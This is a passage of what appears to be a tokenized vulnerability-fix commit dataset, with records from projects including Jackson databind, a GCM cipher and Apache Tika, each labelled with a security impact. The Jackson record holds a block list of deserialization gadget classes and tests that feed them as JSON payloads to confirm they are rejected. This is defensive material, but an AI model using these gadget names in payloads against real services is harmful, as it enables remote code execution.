"1", ",", "Double", ".", "class", ")", ";", "validate", "(", "filterProcessor", ".", "convert", "(", "\"", "test", "eq", "1000000", "\"", ",", "null", ",", "false", ")", ",\"", "test", "=", ":", "__value_0", "\"", ",", "1", ",", "Double", ".", "class", ")", ";", "validate", "(", "filterProcessor", ".", "convert", "(", "\"", "test", "eq", "1000000", ".", "45", "\"", ",", "null", ",", "false", ")", ",\"", "test", "=", ":", "__value_0", "\"", ",", "1", ",", "Double", ".", "class", ")", ";", "validate", "(", "filterProcessor", ".", "convert", "(", "\"", "test", "eq", "1000000", "\"", ",", "null", ",", "false", ")", ",\"", "test", "=", ":", "__value_0", "\"", ",", "1", ",", "Double", ".", "class", ")", ";"], "docstring_tokens": ["modify", "or", "delete", "information", "in", "the", "back-end", "database"]}
{"contents": ["Added", "bounds", "check", "to", "GCM"], "code_tokens": ["private", "int", "blocksRemaining", ";", "this", ".", "blocksRemaining", "=", "-", "1", ";", "blocksRemaining", "=", "-", "1", ";", "if", "(", "blocksRemaining", "=", "=", "0", ")", "{", "throw", "new", "IllegalStateException", "(", "\"", "Attempt", "to", "process", "too", "many", "blocks", "\"", ");", "}", "blocksRemaining", "-", "-;</s>"], "docstring_tokens": ["obtain", "user\u806es", "private", "information"]}
{"contents": ["Fix", "#1737"], "code_tokens": ["#", "1737", ":", "Block", "more", "JDK", "types", "from", "polymorphic", "deserialization", "/", "/", "(", "and", "wrt", "[", "databind", "#", "1599", "]", ")", "/", "/", "[", "databind", "#", "1737", "]", ";", "JDK", "provided", "s", ".", "add", "(", "\"", "java", ".", "util", ".", "logging", ".", "FileHandler", "\"", ");", "s", ".", "add", "(", "\"", "java", ".", "rmi", ".", "server", ".", "UnicastRemoteObject", "\"", ");", "/", "/", "[", "databind", "#", "1737", "]", ";", "3rd", "party", "s", ".", "add", "(", "\"", "org", ".", "springframework", ".", "aop", ".", "support", ".", "AbstractBeanFactoryPointcutAdvisor", "\"", ");", "s", ".", "add", "(", "\"", "org", ".", "springframework", ".", "beans", ".", "factory", ".", "config", ".", "PropertyPathFactoryBean", "\"", ");", "s", ".", "add", "(", "\"", "com", ".", "mchange", ".", "v2", ".", "c3p0", ".", "JndiRefForwardingDataSource", "\"", ");", "s", ".", "add", "(", "\"", "com", ".", "mchange", ".", "v2", ".", "c3p0", ".", "WrapperConnectionPoolDataSource", "\"", ");", "import", "com", ".", "fasterxml", ".", "jackson", ".", "annotation", ".", "JsonTypeInfo", ";", "static", "class", "PolyWrapper", "{", "@", "JsonTypeInfo", "(", "use", "=", "JsonTypeInfo", ".", "Id", ".", "CLASS", ",", "include", "=", "JsonTypeInfo", ".", "As", ".", "WRAPPER_ARRAY", ")", "public", "Object", "v", ";", "}", "/", "*", "/", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "/", "*", "Unit", "tests", "/", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*", "/", "private", "final", "ObjectMapper", "MAPPER", "=", "objectMapper", "(", ");", "/", "/", "/", "/", "/", "/", "Tests", "for", "[", "databind", "#", "1599", "]", "public", "void", "testXalanTypes1599", "(", ")", "throws", "Exception", "final", "String", "clsName", "=", "\"", "com", ".", "sun", ".", "org", ".", "apache", ".", "xalan", ".", "internal", ".", "xsltc", ".", "trax", ".", "TemplatesImpl", "\"", ";", "\"", "'", "obj", "'", ":[", "'", "\"+", "clsName", "+", "\"'", ",\\", "n", "\"", "+", "\"", "{", "\\", "n", "\"", "+", "\"", "'", "transletBytecodes", "'", ":", "[", "'", "AAIAZQ", "=", "='", "]", ",\\", "n", "\"", "+", "\"", "'", "transletName", "'", ":", "'", "a", ".", "b", "'", ",\\", "n", "\"", "_verifySecurityException", "(", "e", ",", "clsName", ")", ";", "}", "}", "/", "/", "/", "/", "/", "/", "Tests", "for", "[", "databind", "#", "1737", "]", "public", "void", "testJDKTypes1737", "(", ")", "throws", "Exception", "{", "_testTypes1737", "(", "java", ".", "util", ".", "logging", ".", "FileHandler", ".", "class", ")", ";", "_testTypes1737", "(", "java", ".", "rmi", ".", "server", ".", "UnicastRemoteObject", ".", "class", ")", ";", "}", "/", "/", "17", "-", "Aug", "-", "2017", ",", "tatu", ":", "Ideally", "would", "test", "handling", "of", "3rd", "party", "types", ",", "too", ",", "/", "/", "but", "would", "require", "adding", "dependencies", ".", "This", "may", "be", "practical", "when", "/", "/", "checking", "done", "by", "module", ",", "but", "for", "now", "let", "'", "s", "not", "do", "that", "for", "databind", ".", "/", "*", "public", "void", "testSpringTypes1737", "(", ")", "throws", "Exception", "{", "_testTypes1737", "(", "\"", "org", ".", "springframework", ".", "aop", ".", "support", ".", "AbstractBeanFactoryPointcutAdvisor", "\"", ");", "_testTypes1737", "(", "\"", "org", ".", "springframework", ".", "beans", ".", "factory", ".", "config", ".", "PropertyPathFactoryBean", "\"", ");", "}", "public", "void", "testC3P0Types1737", "(", ")", "throws", "Exception", "{", "_testTypes1737", "(", "\"", "com", ".", "mchange", ".", "v2", ".", "c3p0", ".", "JndiRefForwardingDataSource", "\"", ");", "_testTypes1737", "(", "\"", "com", ".", "mchange", ".", "v2", ".", "c3p0", ".", "WrapperConnectionPoolDataSource", "\"", ");", "}", "*", "/", "private", "void", "_testTypes1737", "(", "Class", "<", "?>", "nasty", ")", "throws", "Exception", "{", "_testTypes1737", "(", "nasty", ".", "getName", "(", "))", ";", "}", "private", "void", "_testTypes1737", "(", "String", "clsName", ")", "throws", "Exception", "{", "/", "/", "While", "usually", "exploited", "via", "default", "typing", "let", "'", "s", "not", "require", "/", "/", "it", "here", ";", "mechanism", "still", "the", "same", "String", "json", "=", "aposToQuotes", "(", "\"", "{'", "v", "'", ":[", "'\"", "+", "clsName", "+", "\"'", ",'", "/", "tmp", "/", "foobar", ".", "txt", "'", "]}", "\"", ")", ";", "try", "{", "MAPPER", ".", "readValue", "(", "json", ",", "PolyWrapper", ".", "class", ")", ";", "fail", "(", "\"", "Should", "not", "pass", "\"", ");", "}", "catch", "(", "JsonMappingException", "e", ")", "{", "_verifySecurityException", "(", "e", ",", "clsName", ")", ";", "}", "}", "protected", "void", "_verifySecurityException", "(", "Throwable", "t", ",", "String", "clsName", ")", "throws", "Exception", "{", "/", "/", "17", "-", "Aug", "-", "2017", ",", "tatu", ":", "Expected", "type", "more", "granular", "in", "2", ".", "9", "(", "over", "2", ".", "8", ")", "_verifyException", "(", "t", ",", "JsonMappingException", ".", "class", ",", "\"", "Illegal", "type", "\"", ",", "\"", "to", "deserialize", "\"", ",", "\"", "prevented", "for", "security", "reasons", "\"", ");", "verifyException", "(", "t", ",", "clsName", ")", ";", "}", "protected", "void", "_verifyException", "(", "Throwable", "t", ",", "Class", "<", "?>", "expExcType", ",", "String", ".", "..", "patterns", ")", "throws", "Exception", "{", "Class", "<", "?>", "actExc", "=", "t", ".", "getClass", "(", ");", "if", "(", "!", "expExcType", ".", "isAssignableFrom", "(", "actExc", ")", ")", "{", "fail", "(", "\"", "Expected", "Exception", "of", "type", "'", "\"+", "expExcType", ".", "getName", "(", ")+", "\"'", ",", "got", "'", "\"", "+", "actExc", ".", "getName", "(", ")+", "\"'", ",", "message", ":", "\"", "+", "t", ".", "getMessage", "(", "))", ";", "}", "for", "(", "String", "pattern", ":", "patterns", ")", "{", "verifyException", "(", "t", ",", "pattern", ")", ";</s>/", "/", "(", "and", "wrt", "[", "databind", "#", "1599", "]", "public", "void", "testIssue1599", "(", ")", "throws", "Exception", "+", "\"", "'", "obj", "'", ":[", "'", "com", ".", "sun", ".", "org", ".", "apache", ".", "xalan", ".", "internal", ".", "xsltc", ".", "trax", ".", "TemplatesImpl", "'", ",\\", "n", "\"", "verifyException", "(", "e", ",", "\"", "Illegal", "type", "\"", ");", "verifyException", "(", "e", ",", "\"", "to", "deserialize", "\"", ");", "verifyException", "(", "e", ",", "\"", "prevented", "for", "security", "reasons", "\"", ");"], "docstring_tokens": ["execute", "arbitrary", "code", "on", "the", "system"]}
{"contents": ["TIKA-3084", "--", "upgrade", "mp4", "parser", "dependency"], "code_tokens": ["<", "groupId", ">", "org", ".", "tallison", "<", "/", "groupId", ">", "<", "version", ">", "1", ".", "9", ".", "41", ".", "2", "<", "/", "version", ">", "import", "org", ".", "apache", ".", "tika", ".", "config", ".", "Field", ";", "import", "org", ".", "mp4parser", ".", "Box", ";", "import", "org", ".", "mp4parser", ".", "Container", ";", "import", "org", ".", "mp4parser", ".", "IsoFile", ";", "import", "org", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleAlbumBox", ";", "import", "org", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleArtist2Box", ";", "import", "org", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleArtistBox", ";", "import", "org", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleCommentBox", ";", "import", "org", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleCompilationBox", ";", "import", "org", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleDiskNumberBox", ";", "import", "org", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleEncoderBox", ";", "import", "org", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleGPSCoordinatesBox", ";", "import", "org", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleGenreBox", ";", "import", "org", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleItemListBox", ";", "import", "org", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleNameBox", ";", "import", "org", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleRecordingYear2Box", ";", "import", "org", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleTrackAuthorBox", ";", "import", "org", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleTrackNumberBox", ";", "import", "org", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "Utf8AppleDataBox", ";", "import", "org", ".", "mp4parser", ".", "boxes", ".", "iso14496", ".", "part12", ".", "FileTypeBox", ";", "import", "org", ".", "mp4parser", ".", "boxes", ".", "iso14496", ".", "part12", ".", "MetaBox", ";", "import", "org", ".", "mp4parser", ".", "boxes", ".", "iso14496", ".", "part12", ".", "MovieBox", ";", "import", "org", ".", "mp4parser", ".", "boxes", ".", "iso14496", ".", "part12", ".", "MovieHeaderBox", ";", "import", "org", ".", "mp4parser", ".", "boxes", ".", "iso14496", ".", "part12", ".", "SampleDescriptionBox", ";", "import", "org", ".", "mp4parser", ".", "boxes", ".", "iso14496", ".", "part12", ".", "SampleTableBox", ";", "import", "org", ".", "mp4parser", ".", "boxes", ".", "iso14496", ".", "part12", ".", "TrackBox", ";", "import", "org", ".", "mp4parser", ".", "boxes", ".", "iso14496", ".", "part12", ".", "TrackHeaderBox", ";", "import", "org", ".", "mp4parser", ".", "boxes", ".", "iso14496", ".", "part12", ".", "UserDataBox", ";", "import", "org", ".", "mp4parser", ".", "boxes", ".", "sampleentry", ".", "AudioSampleEntry", ";", "try", "(", "IsoFile", "isoFile", "=", "new", "IsoFile", "(", "tstream", ".", "getFile", "(", "))", ")", "{", "tmp", ".", "addResource", "(", "isoFile", ")", ";", "/", "/", "Grab", "the", "file", "type", "box", "FileTypeBox", "fileType", "=", "getOrNull", "(", "isoFile", ",", "FileTypeBox", ".", "class", ")", ";", "if", "(", "fileType", "!", "=", "null", ")", "{", "/", "/", "Identify", "the", "type", "MediaType", "type", "=", "MediaType", ".", "application", "(", "\"", "mp4", "\"", ");", "for", "(", "Map", ".", "Entry", "<", "MediaType", ",", "List", "<", "String", ">", ">", "e", ":", "typesMap", ".", "entrySet", "(", "))", "{", "if", "(", "e", ".", "getValue", "(", ").", "contains", "(", "fileType", ".", "getMajorBrand", "(", "))", ")", "{", "type", "=", "e", ".", "getKey", "(", ");", "break", ";", "}", "metadata", ".", "set", "(", "Metadata", ".", "CONTENT_TYPE", ",", "type", ".", "toString", "(", "))", ";", "if", "(", "type", ".", "getType", "(", ").", "equals", "(", "\"", "audio", "\"", "))", "{", "metadata", ".", "set", "(", "XMPDM", ".", "AUDIO_COMPRESSOR", ",", "fileType", ".", "getMajorBrand", "(", ").", "trim", "(", "))", ";", "}", "else", "{", "/", "/", "Some", "older", "QuickTime", "files", "lack", "the", "FileType", "metadata", ".", "set", "(", "Metadata", ".", "CONTENT_TYPE", ",", "\"", "video", "/", "quicktime", "\"", ");", "}", "/", "/", "Get", "the", "main", "MOOV", "box", "MovieBox", "moov", "=", "getOrNull", "(", "isoFile", ",", "MovieBox", ".", "class", ")", ";", "if", "(", "moov", "=", "=", "null", ")", "{", "/", "/", "Bail", "out", "return", ";", "}", "XHTMLContentHandler", "xhtml", "=", "new", "XHTMLContentHandler", "(", "handler", ",", "metadata", ")", ";", "xhtml", ".", "startDocument", "(", ");", "handleMovieHeaderBox", "(", "moov", ",", "metadata", ",", "xhtml", ")", ";", "handleTrackBoxes", "(", "moov", ",", "metadata", ",", "xhtml", ")", ";", "/", "/", "Get", "metadata", "from", "the", "User", "Data", "Box", "UserDataBox", "userData", "=", "getOrNull", "(", "moov", ",", "UserDataBox", ".", "class", ")", ";", "if", "(", "userData", "!", "=", "null", ")", "{", "extractGPS", "(", "userData", ",", "metadata", ")", ";", "MetaBox", "metaBox", "=", "getOrNull", "(", "userData", ",", "MetaBox", ".", "class", ")", ";", "/", "/", "Check", "for", "iTunes", "Metadata", "/", "/", "See", "http", ":", "//", "atomicparsley", ".", "sourceforge", ".", "net", "/", "mpeg", "-", "4files", ".", "html", "and", "/", "/", "http", ":", "//", "code", ".", "google", ".", "com", "/", "p", "/", "mp4v2", "/", "wiki", "/", "iTunesMetadata", "for", "more", "on", "these", "handleApple", "(", "metaBox", ",", "metadata", ",", "xhtml", ")", ";", "/", "/", "TODO", "Check", "for", "other", "kinds", "too", "}", "/", "/", "All", "done", "xhtml", ".", "endDocument", "(", ");", "}", "finally", "{", "tmp", ".", "dispose", "(", ");", "}", "}", "private", "void", "handleTrackBoxes", "(", "MovieBox", "moov", ",", "Metadata", "metadata", ",", "XHTMLContentHandler", "xhtml", ")", "{", "/", "/", "Get", "some", "more", "information", "from", "the", "track", "header", "/", "/", "TODO", "Decide", "how", "to", "handle", "multiple", "tracks", "List", "<", "TrackBox", ">", "tb", "=", "moov", ".", "getBoxes", "(", "TrackBox", ".", "class", ")", ";", "if", "(", "tb", "=", "=", "null", "|", "|", "tb", ".", "size", "(", ")", "=", "=", "0", ")", "{", "return", ";", "}", "TrackBox", "track", "=", "tb", ".", "get", "(", "0", ")", ";", "TrackHeaderBox", "header", "=", "track", ".", "getTrackHeaderBox", "(", ");", "/", "/", "Get", "the", "creation", "and", "modification", "dates", "metadata", ".", "set", "(", "TikaCoreProperties", ".", "CREATED", ",", "header", ".", "getCreationTime", "(", "))", ";", "metadata", ".", "set", "(", "TikaCoreProperties", ".", "MODIFIED", ",", "header", ".", "getModificationTime", "(", "))", ";", "/", "/", "Get", "the", "video", "with", "and", "height", "metadata", ".", "set", "(", "Metadata", ".", "IMAGE_WIDTH", ",", "(", "int", ")", "header", ".", "getWidth", "(", "))", ";", "metadata", ".", "set", "(", "Metadata", ".", "IMAGE_LENGTH", ",", "(", "int", ")", "header", ".", "getHeight", "(", "))", ";", "/", "/", "Get", "the", "sample", "information", "SampleTableBox", "samples", "=", "track", ".", "getSampleTableBox", "(", ");", "if", "(", "samples", "!", "=", "null", ")", "{", "SampleDescriptionBox", "sampleDesc", "=", "samples", ".", "getSampleDescriptionBox", "(", ");", "if", "(", "sampleDesc", "!", "=", "null", ")", "{", "/", "/", "Look", "for", "the", "first", "Audio", "Sample", ",", "if", "present", "AudioSampleEntry", "sample", "=", "getOrNull", "(", "sampleDesc", ",", "AudioSampleEntry", ".", "class", ")", ";", "if", "(", "sample", "!", "=", "null", ")", "{", "XMPDM", ".", "ChannelTypePropertyConverter", ".", "convertAndSet", "(", "metadata", ",", "sample", ".", "getChannelCount", "(", "))", ";", "/", "/", "metadata", ".", "set", "(", "XMPDM", ".", "AUDIO_SAMPLE_TYPE", ",", "sample", ".", "getSampleSize", "(", "))", ";", "/", "/", "TODO", "Num", "-", ">", "Type", "mapping", "metadata", ".", "set", "(", "XMPDM", ".", "AUDIO_SAMPLE_RATE", ",", "(", "int", ")", "sample", ".", "getSampleRate", "(", "))", ";", "/", "/", "metadata", ".", "set", "(", "XMPDM", ".", "AUDIO_", ",", "sample", ".", "getSamplesPerPacket", "(", "))", ";", "/", "/", "metadata", ".", "set", "(", "XMPDM", ".", "AUDIO_", ",", "sample", ".", "getBytesPerSample", "(", "))", ";", "}", "}", "}", "private", "void", "handleMovieHeaderBox", "(", "MovieBox", "moov", ",", "Metadata", "metadata", ",", "XHTMLContentHandler", "xhtml", ")", "{", "/", "/", "Pull", "out", "some", "information", "from", "the", "header", "box", "MovieHeaderBox", "mHeader", "=", "getOrNull", "(", "moov", ",", "MovieHeaderBox", ".", "class", ")", ";", "if", "(", "mHeader", "=", "=", "null", ")", "{", "return", ";", "}", "/", "/", "Get", "the", "creation", "and", "modification", "dates", "metadata", ".", "set", "(", "TikaCoreProperties", ".", "CREATED", ",", "mHeader", ".", "getCreationTime", "(", "))", ";", "metadata", ".", "set", "(", "TikaCoreProperties", ".", "MODIFIED", ",", "mHeader", ".", "getModificationTime", "(", "))", ";", "/", "/", "Get", "the", "duration", "double", "durationSeconds", "=", "(", "(", "double", ")", "mHeader", ".", "getDuration", "(", "))", "/", "mHeader", ".", "getTimescale", "(", ");", "metadata", ".", "set", "(", "XMPDM", ".", "DURATION", ",", "DURATION_FORMAT", ".", "format", "(", "durationSeconds", ")", ");", "/", "/", "The", "timescale", "is", "normally", "the", "sampling", "rate", "metadata", ".", "set", "(", "XMPDM", ".", "AUDIO_SAMPLE_RATE", ",", "(", "int", ")", "mHeader", ".", "getTimescale", "(", "))", ";", "}", "private", "void", "handleApple", "(", "MetaBox", "metaBox", ",", "Metadata", "metadata", ",", "XHTMLContentHandler", "xhtml", ")", "throws", "SAXException", "{", "AppleItemListBox", "apple", "=", "getOrNull", "(", "metaBox", ",", "AppleItemListBox", ".", "class", ")", ";", "if", "(", "apple", "=", "=", "null", ")", "{", "return", ";", "}", "/", "/", "Title", "AppleNameBox", "title", "=", "getOrNull", "(", "apple", ",", "AppleNameBox", ".", "class", ")", ";", "addMetadata", "(", "TikaCoreProperties", ".", "TITLE", ",", "metadata", ",", "title", ")", ";", "/", "/", "Artist", "AppleArtistBox", "artist", "=", "getOrNull", "(", "apple", ",", "AppleArtistBox", ".", "class", ")", ";", "addMetadata", "(", "TikaCoreProperties", ".", "CREATOR", ",", "metadata", ",", "artist", ")", ";", "addMetadata", "(", "XMPDM", ".", "ARTIST", ",", "metadata", ",", "artist", ")", ";", "/", "/", "Album", "Artist", "AppleArtist2Box", "artist2", "=", "getOrNull", "(", "apple", ",", "AppleArtist2Box", ".", "class", ")", ";", "addMetadata", "(", "XMPDM", ".", "ALBUM_ARTIST", ",", "metadata", ",", "artist2", ")", ";", "/", "/", "Album", "AppleAlbumBox", "album", "=", "getOrNull", "(", "apple", ",", "AppleAlbumBox", ".", "class", ")", ";", "addMetadata", "(", "XMPDM", ".", "ALBUM", ",", "metadata", ",", "album", ")", ";", "/", "/", "Composer", "AppleTrackAuthorBox", "composer", "=", "getOrNull", "(", "apple", ",", "AppleTrackAuthorBox", ".", "class", ")", ";", "addMetadata", "(", "XMPDM", ".", "COMPOSER", ",", "metadata", ",", "composer", ")", ";", "/", "/", "Genre", "AppleGenreBox", "genre", "=", "getOrNull", "(", "apple", ",", "AppleGenreBox", ".", "class", ")", ";", "addMetadata", "(", "XMPDM", ".", "GENRE", ",", "metadata", ",", "genre", ")", ";", "/", "/", "Year", "AppleRecordingYear2Box", "year", "=", "getOrNull", "(", "apple", ",", "AppleRecordingYear2Box", ".", "class", ")", ";", "if", "(", "year", "!", "=", "null", ")", "{", "metadata", ".", "set", "(", "XMPDM", ".", "RELEASE_DATE", ",", "year", ".", "getValue", "(", "))", ";", "}", "/", "/", "Track", "number", "AppleTrackNumberBox", "trackNum", "=", "getOrNull", "(", "apple", ",", "AppleTrackNumberBox", ".", "class", ")", ";", "if", "(", "trackNum", "!", "=", "null", ")", "{", "metadata", ".", "set", "(", "XMPDM", ".", "TRACK_NUMBER", ",", "trackNum", ".", "getA", "(", "))", ";", "/", "/", "metadata", ".", "set", "(", "XMPDM", ".", "NUMBER_OF_TRACKS", ",", "trackNum", ".", "getB", "(", "))", ";", "/", "/", "TODO", "}", "/", "/", "Disc", "number", "AppleDiskNumberBox", "discNum", "=", "getOrNull", "(", "apple", ",", "AppleDiskNumberBox", ".", "class", ")", ";", "if", "(", "discNum", "!", "=", "null", ")", "{", "metadata", ".", "set", "(", "XMPDM", ".", "DISC_NUMBER", ",", "discNum", ".", "getA", "(", "))", ";", "}", "/", "/", "Compilation", "AppleCompilationBox", "compilation", "=", "getOrNull", "(", "apple", ",", "AppleCompilationBox", ".", "class", ")", ";", "if", "(", "compilation", "!", "=", "null", ")", "{", "metadata", ".", "set", "(", "XMPDM", ".", "COMPILATION", ",", "(", "int", ")", "compilation", ".", "getValue", "(", "))", ";", "}", "/", "/", "Comment", "AppleCommentBox", "comment", "=", "getOrNull", "(", "apple", ",", "AppleCommentBox", ".", "class", ")", ";", "addMetadata", "(", "XMPDM", ".", "LOG_COMMENT", ",", "metadata", ",", "comment", ")", ";", "/", "/", "Encoder", "AppleEncoderBox", "encoder", "=", "getOrNull", "(", "apple", ",", "AppleEncoderBox", ".", "class", ")", ";", "if", "(", "encoder", "!", "=", "null", ")", "{", "metadata", ".", "set", "(", "XMP", ".", "CREATOR_TOOL", ",", "encoder", ".", "getValue", "(", "))", ";", "}", "/", "/", "As", "text", "for", "(", "Box", "box", ":", "apple", ".", "getBoxes", "(", "))", "{", "if", "(", "box", "instanceof", "Utf8AppleDataBox", ")", "{", "xhtml", ".", "element", "(", "\"", "p", "\"", ",", "(", "(", "Utf8AppleDataBox", ")", "box", ")", ".", "getValue", "(", "))", ";", "/", "**", "*", "Override", "the", "maximum", "record", "size", "limit", ".", "NOTE", ":", "this", "*", "sets", "a", "static", "variable", "on", "the", "IsoFile", "and", "affects", "all", "files", "*", "parsed", "in", "this", "JVM", "!", "!!", "*", "*", "@", "param", "maxRecordSize", "*", "/", "@", "Field", "public", "void", "setMaxRecordSize", "(", "long", "maxRecordSize", ")", "{", "IsoFile", ".", "MAX_RECORD_SIZE_OVERRIDE", "=", "maxRecordSize", ";", "}", "import", "java", ".", "nio", ".", "file", ".", "Paths", ";</s><", "groupId", ">", "com", ".", "googlecode", ".", "mp4parser", "<", "/", "groupId", ">", "<", "version", ">", "1", ".", "1", ".", "22", "<", "/", "version", ">", "/", "*", "*", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "or", "more", "*", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", "with", "*", "this", "work", "for", "additional", "information", "regarding", "copyright", "ownership", ".", "*", "The", "ASF", "licenses", "this", "file", "to", "You", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "*", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "*", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "apache", ".", "tika", ".", "parser", ".", "mp4", ";", "import", "static", "com", ".", "googlecode", ".", "mp4parser", ".", "util", ".", "CastUtils", ".", "l2i", ";", "import", "java", ".", "io", ".", "File", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "io", ".", "RandomAccessFile", ";", "import", "java", ".", "math", ".", "BigInteger", ";", "import", "java", ".", "nio", ".", "ByteBuffer", ";", "import", "java", ".", "nio", ".", "channels", ".", "WritableByteChannel", ";", "import", "com", ".", "googlecode", ".", "mp4parser", ".", "DataSource", ";", "/", "**", "*", "A", "{", "@", "link", "DataSource", "}", "implementation", "that", "relies", "on", "direct", "reads", "from", "a", "{", "@", "link", "RandomAccessFile", "}", ".", "*", "It", "should", "be", "slower", "than", "{", "@", "link", "com", ".", "googlecode", ".", "mp4parser", ".", "FileDataSourceImpl", "}", "but", "does", "not", "incur", "the", "implicit", "file", "locks", "of", "*", "memory", "mapped", "I", "/", "O", "on", "some", "JVMs", ".", "This", "implementation", "allows", "for", "a", "more", "controlled", "deletion", "of", "files", "*", "and", "might", "be", "preferred", "when", "working", "with", "temporary", "files", ".", "*", "@", "see", "<", "a", "href", "=", "\"", "http", ":", "//", "bugs", ".", "java", ".", "com", "/", "view_bug", ".", "do", "?", "bug_id", "=", "4724038", "\"", ">", "JDK", "-", "4724038", ":", "(", "fs", ")", "Add", "unmap", "method", "to", "MappedByteBuffer", "<", "/", "a", ">", "*", "@", "see", "<", "a", "href", "=", "\"", "http", ":", "//", "bugs", ".", "java", ".", "com", "/", "view_bug", ".", "do", "?", "bug_id", "=", "6359560", "\"", ">", "JDK", "-", "6359560", ":", "(", "fs", ")", "File", ".", "deleteOnExit", "(", ")", "doesn", "'", "t", "work", "when", "MappedByteBuffer", "exists", "(", "win", ")", "</", "a", ">", "*", "/", "public", "class", "DirectFileReadDataSource", "implements", "DataSource", "{", "private", "static", "final", "int", "TRANSFER_SIZE", "=", "8192", ";", "private", "RandomAccessFile", "raf", ";", "public", "DirectFileReadDataSource", "(", "File", "f", ")", "throws", "IOException", "{", "this", ".", "raf", "=", "new", "RandomAccessFile", "(", "f", ",", "\"", "r", "\"", ");", "}", "public", "int", "read", "(", "ByteBuffer", "byteBuffer", ")", "throws", "IOException", "{", "int", "len", "=", "byteBuffer", ".", "remaining", "(", ");", "int", "totalRead", "=", "0", ";", "int", "bytesRead", "=", "0", ";", "byte", "[", "]", "buf", "=", "new", "byte", "[", "TRANSFER_SIZE", "]", ";", "while", "(", "totalRead", "<", "len", ")", "{", "int", "bytesToRead", "=", "Math", ".", "min", "(", "(", "len", "-", "totalRead", ")", ",", "TRANSFER_SIZE", ")", ";", "bytesRead", "=", "raf", ".", "read", "(", "buf", ",", "0", ",", "bytesToRead", ")", ";", "if", "(", "bytesRead", "<", "0", ")", "{", "break", ";", "}", "else", "{", "totalRead", "+", "=", "bytesRead", ";", "}", "byteBuffer", ".", "put", "(", "buf", ",", "0", ",", "bytesRead", ")", ";", "}", "if", "(", "bytesRead", "<", "0", "&", "&", "position", "(", ")", "=", "=", "size", "(", ")", "&", "&", "byteBuffer", ".", "hasRemaining", "(", "))", "{", "throw", "new", "IOException", "(", "\"", "End", "of", "stream", "reached", "earlier", "than", "expected", "\"", ");", "}", "return", "(", "(", "bytesRead", "<", "0", ")", "&", "&", "(", "totalRead", "=", "=", "0", ")", ")", "?", "-", "1", ":", "totalRead", ";", "}", "public", "int", "readAllInOnce", "(", "ByteBuffer", "byteBuffer", ")", "throws", "IOException", "{", "if", "(", "byteBuffer", ".", "remaining", "(", ")", ">", "raf", ".", "length", "(", "))", "{", "throw", "new", "IOException", "(", "\"", "trying", "to", "readAllInOnce", "past", "end", "of", "stream", "\"", ");", "}", "byte", "[", "]", "buf", "=", "new", "byte", "[", "byteBuffer", ".", "remaining", "(", ")]", ";", "int", "read", "=", "raf", ".", "read", "(", "buf", ")", ";", "byteBuffer", ".", "put", "(", "buf", ",", "0", ",", "read", ")", ";", "return", "read", ";", "}", "public", "long", "size", "(", ")", "throws", "IOException", "{", "return", "raf", ".", "length", "(", ");", "}", "public", "long", "position", "(", ")", "throws", "IOException", "{", "return", "raf", ".", "getFilePointer", "(", ");", "}", "public", "void", "position", "(", "long", "nuPos", ")", "throws", "IOException", "{", "if", "(", "nuPos", ">", "raf", ".", "length", "(", "))", "{", "throw", "new", "IOException", "(", "\"", "requesting", "seek", "past", "end", "of", "stream", "\"", ");", "}", "raf", ".", "seek", "(", "nuPos", ")", ";", "}", "public", "long", "transferTo", "(", "long", "position", ",", "long", "count", ",", "WritableByteChannel", "target", ")", "throws", "IOException", "{", "return", "target", ".", "write", "(", "map", "(", "position", ",", "count", ")", ");", "}", "public", "ByteBuffer", "map", "(", "long", "startPosition", ",", "long", "size", ")", "throws", "IOException", "{", "if", "(", "startPosition", "<", "0", "|", "|", "size", "<", "0", ")", "{", "throw", "new", "IOException", "(", "\"", "startPosition", "and", "size", "must", "both", "be", ">", "=", "0", "\"", ");", "}", "/", "/", "make", "sure", "that", "start", "+", "size", "aren", "'", "t", "greater", "than", "avail", "size", "/", "/", "in", "raf", ".", "BigInteger", "end", "=", "BigInteger", ".", "valueOf", "(", "startPosition", ")", ";", "end", "=", "end", ".", "add", "(", "BigInteger", ".", "valueOf", "(", "size", ")", ");", "if", "(", "end", ".", "compareTo", "(", "BigInteger", ".", "valueOf", "(", "raf", ".", "length", "(", "))", ")", ">", "0", ")", "{", "throw", "new", "IOException", "(", "\"", "requesting", "read", "past", "end", "of", "stream", "\"", ");", "}", "raf", ".", "seek", "(", "startPosition", ")", ";", "int", "payLoadSize", "=", 